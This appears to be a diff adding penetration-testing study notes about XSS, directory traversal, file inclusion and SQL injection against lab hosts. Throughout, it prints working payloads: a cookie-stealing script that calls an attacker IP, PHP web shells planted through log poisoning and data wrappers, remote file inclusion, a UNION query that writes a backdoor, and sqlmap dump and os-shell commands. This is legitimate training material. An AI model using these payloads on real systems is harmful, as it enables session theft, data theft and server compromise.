@@ -70,3 +70,202 @@ Exploiting web vulnerabilities
 
 Cross site scripting (XSS)
 	web apps need data sanitization
+		never trust a user's input
+	once thought to be low risk -> now is high risk and prevalent
+		can inject things such as JS and side scripts
+	Three variants
+		Stored/ Persistent XSS
+			exploit payload is stored by the server in some fashion
+			payload is ran whenever a user's browser loads the payload
+				ex. forum software, comment sections, user profiles, product reviews
+				worst/ most dangerous kind
+
+		Reflected XSS
+			Some payload is handled as input and displayed back the the user, only affect the user
+			often found in the url or in the request itself
+
+		DOM-based XSS
+			only happens in the DOM itself
+			happens when the page's DOM is modified with user controlled input
+
+		Impacts/ goals would be session hijacking, forced redirection, execution of local applicatoins that the user has, etc
+
+	Identifying XSS vulnerabilities
+		looking at the input fields
+			forms, urls, parameters in requests
+		see if special characters are filtered out
+			< > ' " { } ;
+			<>'s are used in HTML to denote a tag, or a specific block of code
+			if the page does not remove or encode the characters at all, then there is likely a vulnerability
+				NOTE: even if there is encoding, sometime we can use that encoding to bypass a filter
+				URL and HTML encoding are common
+					URL encoding = a space is %20
+					HTML encoding = < is &lt;
+
+	Basic XSS
+		filters and sanitization should be applied when the data is captured and displayed, defense in depth
+		i skip bc an supar l337 hacker
+
+	Content injection
+		XSS vulns are sneaky bc they allow for control of redirection of the victim's browser
+		one method is to add an invisible iframe
+			<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
+				iframes are meant to embed a file like an image or something
+				here, the file "report" is hyperlinked
+			now any user that visits the page will make a get to 10.11.0.4/report
+				could redirect to a client side attack or to an info gather script or something
+
+	Stealing cookies and session info
+		if the server is not correctly using a proper session management system, we can steal the user's cookie and impersonate them
+			important flags when configuring cookies:
+			Secure - only allows the transfer of cookies over HTTPS
+			HttpOnly - deny javascript access to the cookie, if this flag is not set, we can use the XSS payload to steal the cookie
+				if this flag is sent, some more work needs to be done
+				sometimes this rule is relaxed for subdomains, possibly can pass cookie from one domain to the next
+		Send the cookie to the server as part of the request
+			<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script>
+
+	Other XSS attack vectors
+		if there is no filter, just have access to running arbitray javascript (limited by length of injection)
+		some examples include keyloggers, phishing attacks, port scanning, content scrapers
+
+
+Directory Traversal Vulns
+	aka path traversal vulns
+	getting unauthorized access to files not normally accessible to the webapp
+	soemthing like file.php?=index.htnl could be abused to file.php?=/etc/passwd
+
+	Identifying and Exploiting Directory Traversal
+		usually found by inspecting the URL, is there a parameter to get a specific file?
+			can you validate by shoving in /etc/passwd or c:\boot.ini
+			error about the full path or something indicate that the payload may need to be adjusted
+			trying chains of "../" before the filename
+			info recon is important here, what is the tech  stack and the OS of the box? what files would be interesting from those stacks?
+
+		example /etc/hosts
+			http://10.11.0.22/menu.php?file=c:\windows\system32\drivers\etc\hosts
+
+File inclusion vulns
+	allows an attacker to include a file into the application's current running code, not just display the contents
+	LFI - local file inclusion, store the file on the victim server
+	RFI - remote file inclusion, store the file somewhere else :^)
+	commonly found in PHP apps although persist in other programming languages
+
+	Identifying File Inclusion Vulns
+		Discovered in the same way as directory traversals, locate the parameters and start fuzzing :)
+		Check for RFI by inserting a URL or SMB share instead of a local path
+		less likely to find RFI
+
+	Contaminating Log Files
+		one way to inject code into the server is to make a request with code in the URL
+		most servers will log the url that we request, then theres valid code in the log file
+		include the log file and execute code :^)
+
+		send the PHP code into the log file with netcat :)
+			nc -nv 10.11.0.22 80
+			(UNKNOWN) [10.11.0.22] 80 (http) open
+			<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
+
+	LFI Code execution
+		once the code is sent into the log file, we can execute commands thru the webshell we injected
+			http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
+
+	Remote File Inclusion
+		Require the server to set in a specifc way although are generally easier to exploit
+		require the allow_url_include php setting to be set, newer versions have this toggled off by default
+		http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
+			host the server, see if a get request comes in
+
+	Expanding the repertoire
+		ways to host servers easily
+		python -m SimpleHTTPServer 7331 (python2.x)
+		python3 -m http.server 7331 	(python3)
+		php -S 0.0.0.0:8000
+		ruby -run -e httpd . -p 9000
+		busybox httpd -f -p 10000
+
+	PHP Wrappers
+		PHP has protocol wrappers that can help give flexability in file Inclusion and traveral exploits
+		can use the data wrapper to encode the data in plain text or base64
+			http://10.11.0.22/menu.php?file=data:text/plain,hello world
+			http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
+
+SQL Injection
+	common web vuln where user input is inserted into SQL queries, allowing an attacker to run untrusted SQL commands
+	SQL queries are used to interact with the backend DB
+	Goal is to break out of or change the initial query
+	can lead to info leakage, or even server compromise
+
+	Basic SQL Syntax
+		Databases have databases, tables, rows, and columns
+			+----+------------+--------------+
+			| id | username   | password     |
+			+----+------------+--------------+
+			|  1 | tom.jones  | notunusual   |
+		SELECT - most commonly used operator
+			SELECT * FROM users;
+			will take everything from the users table
+		SELECT username FROM users WHERE id=1;
+			wil get all the items in the "username" column from the "users" table where the value in the "id" column is equal to 1
+
+	Identifying SQL Injection Vulns
+		First step in finding locations where data (and user input) is passing through a database
+		Common examples include authentication - database containing users and passwords, prodcuts in an ecommerce site or threads on message forums
+		Shoving in bad characters, looking to see if the database returns an error, often indicates user input is not handled correctly
+
+	Authentication bypass
+		classic example of SQLi
+		Normal use case
+			select * from users where name = 'tom' and password = 'jones';
+		Injected code
+			select * from users where name = 'tom' or 1=1;#' and password = 'jones';
+				end of statement is 1=1; the rest is commented out with a #
+				will get ANY entry that matches the boolean of name = 'tom' OR 1=1
+				1 always = 1 and therefore will get the first user in the database
+			select * from users where name = 'tom' or 1=1 LIMIT 1;#
+				add a limit of one returned entry
+
+	Enumerating the Database
+		Can also start getting info about how the database is laid out
+
+	Column Number Enumeration
+		use the order by clause to find the amount of columns
+			http://10.11.0.22/debug.php?id=1 order by 1
+			http://10.11.0.22/debug.php?id=1 order by 2
+			http://10.11.0.22/debug.php?id=1 order by ... ( until there is an error )
+		once the max columns have been exceeded, the DB will error
+		easy to use the burp repeater for this
+
+	Understanding hte layout of the output
+		UNION allows us to make a second select statement within the first statement (used for practice 9.9.4)
+		"union all select 1, 2, 3
+			will select the 1, 2, 3 columns
+
+	Extracting data from the DB
+		cna start pulling data from the DB
+			syntax depends on the version of the DB
+			/debug.php?id=1 union all select 1, 2, @@version
+				get the version of hte MariaDB
+			/debug.php?id=1 union all select 1, 2, user()
+				get the user running the DB
+			/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables
+				getting the table names
+			/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+				get the columns in the table
+
+	From SQLi to code execution
+		/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
+			loads the file specified
+		/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+			this will add a web shell into the webroot of the server
+
+		Automating SQLi
+			sqlmap is installed by default in kali
+			sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+				-u - url to scan
+				-p - parameter to Check
+				-dbms - the database software
+				--dump - show results
+			sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+				--os-shell - get a shell!
+
